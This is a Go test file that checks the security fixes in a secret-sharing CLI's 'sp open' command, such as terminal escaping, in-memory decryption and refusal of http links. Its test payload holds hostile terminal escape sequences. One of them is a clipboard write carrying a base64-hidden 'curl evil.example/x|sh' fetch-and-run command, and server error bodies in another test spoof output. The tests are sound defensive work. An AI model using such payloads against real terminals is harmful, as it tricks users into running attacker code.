package main

// Regression tests for the security review of sp open (the proofs of concept
// on the review branch, inverted: each one fails if its weakness returns),
// and tests for the fixes that came with them.

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"unicode"
	"unicode/utf8"

	"github.com/Battleroid/snap-share/internal/e2e"
)

const termPayload = "db password: hunter2\n" +
	"\x1b]52;c;Y3VybCBldmlsLmV4YW1wbGUveHxzaAo=\x07" + // OSC 52: set the clipboard
	"\x1b[1A\x1b[2K" + // up one line, erase it
	"\x1b]8;;https://evil.example/\x1b\\click here\x1b]8;;\x1b\\\n" + // OSC 8 link
	"tab\there \u009b2J and café\n" // a C1 CSI; tabs and non-ASCII stay

// RT-TERM1: on a terminal, sp open must not write the sender's control
// sequences; --raw and a pipe get the exact bytes.
func TestSPOpenEscapesTerminalControls(t *testing.T) {
	e := newSPEnv(t)
	open := func(link string, tty bool, args ...string) (string, string) {
		t.Helper()
		sio, out, errb := e.io("", "")
		sio.outTTY = tty
		if err := runOpen(context.Background(), append([]string{link}, args...), sio); err != nil {
			t.Fatal(err)
		}
		return out.String(), errb.String()
	}

	out, stderr := open(e.secret(termPayload, "", "--views", "3"), true)
	if strings.ContainsAny(out, "\x1b\x07\u009b") {
		t.Fatalf("raw control characters on a terminal: %q", out)
	}
	for _, want := range []string{"db password: hunter2\n", "^[]52;c;", "^G", "^[[1A^[[2K", "tab\there ^[[2J and café\n"} {
		if !strings.Contains(out, want) {
			t.Errorf("escaped output lacks %q: %q", want, out)
		}
	}
	if !strings.Contains(stderr, "--raw") {
		t.Errorf("no note about the escaping: %q", stderr)
	}

	link := e.secret(termPayload, "", "--views", "2")
	if out, _ := open(link, true, "--raw"); out != termPayload {
		t.Fatalf("--raw: %q", out)
	}
	if out, stderr := open(link, false); out != termPayload || strings.Contains(stderr, "--raw") {
		t.Fatalf("to a pipe: %q %q", out, stderr)
	}

	// Plain text on a terminal is untouched and says nothing.
	if out, stderr := open(e.secret("just text\twith a tab\n", ""), true); out != "just text\twith a tab\n" || strings.Contains(stderr, "control") {
		t.Fatalf("plain text: %q %q", out, stderr)
	}
}

// RT-TERM2: a server's error sentence is printed without control
// characters, and cut short.
func TestSPOpenStripsServerErrorEscapes(t *testing.T) {
	long := strings.Repeat("A", 5000)
	for _, body := range []string{
		`{"error":"\u001b]0;owned\u0007\u001b[2J\u001b[Hsp: secret saved to ~/Downloads (fake)"}`,
		`{"error":"line one\nsp: fake second line\u009b"}`,
		`{"error":"` + long + `"}`,
	} {
		srv := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusBadRequest)
			_, _ = w.Write([]byte(body))
		}))
		id, _ := e2e.NewID()
		key, _ := e2e.NewLinkKey()
		var out, errb bytes.Buffer
		sio := secretIO{in: strings.NewReader(""), out: &out, err: &errb, hc: srv.Client(), dir: t.TempDir(),
			ask: func(string, bool) ([]byte, error) { return nil, nil }}
		err := runOpen(context.Background(), []string{e2e.FormatLink(srv.URL, id, key)}, sio)
		srv.Close()
		if err == nil {
			t.Fatal("no error")
		}
		msg := err.Error()
		if strings.ContainsAny(msg, "\x1b\x07\n\u009b") {
			t.Fatalf("control characters in the error: %q", msg)
		}
		if n := utf8.RuneCountInString(msg); n > maxServerText+1 {
			t.Fatalf("error of %d characters", n)
		}
	}
	// main prints every error through termString.
	if got := termString("bad \x1b[2J\x07 thing\nnext"); got != "bad ^[[2J^G thing\nnext" {
		t.Fatalf("termString: %q", got)
	}
}

// tmpSpy is stdout for sp open -o -: when sp starts writing the plaintext,
// it lists sp's temporary files in TMPDIR and the current directory.
type tmpSpy struct {
	dirs  []string
	found []string
	once  sync.Once
	buf   bytes.Buffer
}

func (s *tmpSpy) Write(p []byte) (int, error) {
	s.once.Do(func() {
		for _, d := range s.dirs {
			ents, _ := os.ReadDir(d)
			for _, e := range ents {
				b, _ := os.ReadFile(filepath.Join(d, e.Name())) // #nosec G304 -- a test directory
				if bytes.Contains(b, []byte("RT-TMP-PLAINTEXT")) {
					s.found = append(s.found, filepath.Join(d, e.Name()))
				}
			}
		}
	})
	return s.buf.Write(p)
}

// RT-TMP: "sp open LINK -o -" decrypts in memory; the plaintext never goes
// to a temporary file.
func TestSPOpenStdoutStaysInMemory(t *testing.T) {
	e := newSPEnv(t)
	tmp := t.TempDir()
	src := filepath.Join(t.TempDir(), "key.pem")
	content := []byte("-----BEGIN RT-TMP-PLAINTEXT-----\n" + strings.Repeat("x", 3<<20) + "\n")
	if err := os.WriteFile(src, content, 0o600); err != nil {
		t.Fatal(err)
	}
	link := e.secret("", "", src)
	t.Setenv("TMPDIR", tmp)
	spy := &tmpSpy{dirs: []string{tmp, e.dir}}
	sio, _, _ := e.io("", "")
	sio.out = spy
	if err := runOpen(context.Background(), []string{link, "-o", "-"}, sio); err != nil {
		t.Fatal(err)
	}
	if len(spy.found) != 0 {
		t.Fatalf("plaintext written to %v", spy.found)
	}
	if !bytes.Equal(spy.buf.Bytes(), content) {
		t.Fatalf("stdout got %d bytes, want %d", spy.buf.Len(), len(content))
	}
}

// Files over 64 MiB are refused for stdout before a view is used.
func TestSPOpenStdoutRefusesLargeFiles(t *testing.T) {
	var mu sync.Mutex
	claims := 0
	salt := e2e.Encode(make([]byte, 16))
	srv := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		mu.Lock()
		defer mu.Unlock()
		w.Header().Set("Content-Type", "application/json")
		switch {
		case strings.HasSuffix(r.URL.Path, "/info"):
			size := int64(maxStdoutFile + 1)
			_ = json.NewEncoder(w).Encode(map[string]any{"state": "ready", "kind": "file", "salt": salt, "kdf": nil,
				"size": size, "ct_size": e2e.CiphertextSize(size), "views_left": 1})
		default:
			claims++
			http.NotFound(w, r)
		}
	}))
	defer srv.Close()
	id, _ := e2e.NewID()
	key, _ := e2e.NewLinkKey()
	var out, errb bytes.Buffer
	sio := secretIO{in: strings.NewReader(""), out: &out, err: &errb, hc: srv.Client(), dir: t.TempDir()}
	err := runOpen(context.Background(), []string{e2e.FormatLink(srv.URL, id, key), "-o", "-"}, sio)
	if err == nil || !strings.Contains(err.Error(), "-o FILE") {
		t.Fatalf("err = %v", err)
	}
	mu.Lock()
	defer mu.Unlock()
	if claims != 0 {
		t.Fatal("claimed (used a view) before refusing")
	}
}

// sp open refuses http:// links unless --insecure.
func TestSPOpenRefusesHTTP(t *testing.T) {
	var mu sync.Mutex
	hits := 0
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		mu.Lock()
		hits++
		mu.Unlock()
		http.NotFound(w, r)
	}))
	defer srv.Close()
	id, _ := e2e.NewID()
	key, _ := e2e.NewLinkKey()
	link := e2e.FormatLink(srv.URL, id, key)
	run := func(args ...string) error {
		var out, errb bytes.Buffer
		return runOpen(context.Background(), append([]string{link}, args...),
			secretIO{in: strings.NewReader(""), out: &out, err: &errb, dir: t.TempDir()})
	}
	if err := run(); err == nil || !strings.Contains(err.Error(), "--insecure") {
		t.Fatalf("http link: %v", err)
	}
	mu.Lock()
	if hits != 0 {
		t.Fatal("contacted the server")
	}
	mu.Unlock()
	if err := run("--insecure"); err == nil || !strings.Contains(err.Error(), "nothing here") {
		t.Fatalf("--insecure: %v", err)
	}
	mu.Lock()
	defer mu.Unlock()
	if hits == 0 {
		t.Fatal("--insecure did not reach the server")
	}
}

// secretLocalName follows the table the browser's safeName is also tested
// against (test/js/secrets.test.mjs).
func TestSPSecretLocalNameTable(t *testing.T) {
	b, err := os.ReadFile("../../internal/e2e/testdata/safename.json")
	if err != nil {
		t.Fatal(err)
	}
	var tab struct {
		Cases []struct{ In, Out, Note string }
	}
	if err := json.Unmarshal(b, &tab); err != nil {
		t.Fatal(err)
	}
	if len(tab.Cases) < 30 {
		t.Fatalf("only %d cases", len(tab.Cases))
	}
	for _, c := range tab.Cases {
		if got := secretLocalName(c.In); got != c.Out {
			t.Errorf("secretLocalName(%q) = %q, want %q %s", c.In, got, c.Out, c.Note)
		}
	}
}

// The Cf code points test/js/secrets.test.mjs checks in the browser are Cf
// in Go's tables too, and removed.
func TestSPSecretLocalNameRemovesCf(t *testing.T) {
	for _, r := range []rune{0xad, 0x600, 0x601, 0x602, 0x603, 0x604, 0x605, 0x61c, 0x6dd, 0x70f, 0x890, 0x891, 0x8e2, 0x180e, 0x200b, 0x200f,
		0x202a, 0x202e, 0x2060, 0x2064, 0x2066, 0x206f, 0xfeff, 0xfff9, 0xfffb, 0x110bd, 0x110cd, 0x13430, 0x1343f, 0x1bca0, 0x1bca3,
		0x1d173, 0x1d17a, 0xe0001, 0xe0020, 0xe0041, 0xe007f} {
		if !unicode.Is(unicode.Cf, r) {
			t.Errorf("U+%04X is not Cf in Go's tables", r)
		}
		if got := secretLocalName("a" + string(r) + "b.txt"); got != "ab.txt" {
			t.Errorf("U+%04X: %q", r, got)
		}
	}
}

func TestTermEscape(t *testing.T) {
	for in, want := range map[string]string{
		"plain text\n": "plain text\n",
		"tab\tand\nnl": "tab\tand\nnl",
		"café 世":       "café 世",
		"\x1b[31mred":  "^[[31mred",
		"\x00\x07\x7f": "^@^G^?",
		"\r\x08":       "^M^H",
		"\u009b\u009d": "^[[^[]",
		"bad \xff\xfe": `bad \xff\xfe`,
		" nbsp":        " nbsp",
		"�":            "�",
	} {
		got, changed := termEscape([]byte(in))
		if string(got) != want || changed != (in != want) {
			t.Errorf("termEscape(%q) = %q %t, want %q", in, got, changed, want)
		}
	}
}

func TestServerText(t *testing.T) {
	if got := serverText("Wrong \x1b]0;x\x07passphrase.\n\u009b"); got != "Wrong ]0;xpassphrase." {
		t.Fatalf("serverText: %q", got)
	}
	got := serverText(strings.Repeat("é", 1000))
	if n := utf8.RuneCountInString(got); n != maxServerText+1 || !strings.HasSuffix(got, "…") {
		t.Fatalf("not capped: %d", n)
	}
	if fmt.Sprint(serverText("")) != "" {
		t.Fatal("empty")
	}
}
